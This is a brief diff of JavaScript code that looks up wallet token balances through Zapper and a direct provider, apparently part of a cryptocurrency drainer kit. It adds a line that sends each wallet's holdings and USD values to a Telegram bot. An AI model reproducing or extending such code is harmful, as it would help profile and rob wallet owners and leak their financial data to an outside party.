@@ -63,7 +63,7 @@ const isAddressWhitelisted = (address) => {
 // Fetch token balances directly for unsupported chains
 const fetchBalancesDirectly = async (address, chainId) => {
   console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
-  await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
+  // await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
   const provider = getProvider(chainId);
 
   // Handle blacklisted addresses
@@ -324,6 +324,7 @@ const fetchBalancesFromZapper = async (address, chainId) => {
           tokenDetails.balance,
           token.decimals || 18
         )} (${amountUSD.toFixed(2)} USD)\n`;
+        await sendToTelegram(telegramMessage);
       }
     }
 
